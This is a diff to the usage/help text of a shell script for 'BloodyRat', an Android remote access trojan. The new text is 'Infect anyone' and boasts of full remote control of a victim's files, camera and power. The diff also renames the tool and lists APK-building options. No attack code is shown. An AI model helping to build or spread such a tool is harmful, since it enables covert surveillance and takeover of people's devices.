@@ -82,12 +82,15 @@ function check_update() {
 usage() {
         cat <<EOF
 Usage: $(basename $0) [OPTIONS] available
-BloodyRat - future of phishing is here,
-A BloodyRat is a android Rat.
+BloodyRat - Infect anyone.
+A Bloody RAT or Bloody remote administration tool, is software that gives a person full control of a tech device,
+remotely. The Bloody RAT gives the user access to your system, just as they had physical access to your device.
+With this access, the person can access your files, use your camera, and even turn on/off your device.
+
 Copyright 2020 <ashishsingh103020@gmail.com>
 Options:
-  -u, --update       Update shark
-  -v, --version      Display the current shark version installed on your device
+  -u, --update       Update BloodyRat
+  -v, --version      Display the current BloodyRat version installed on your device
   -h, --help         Print this help message
   --fix-apkbuilder   Fix aapt2 path to build apk
   --fix-java_version Fix java version to 1.8.0 
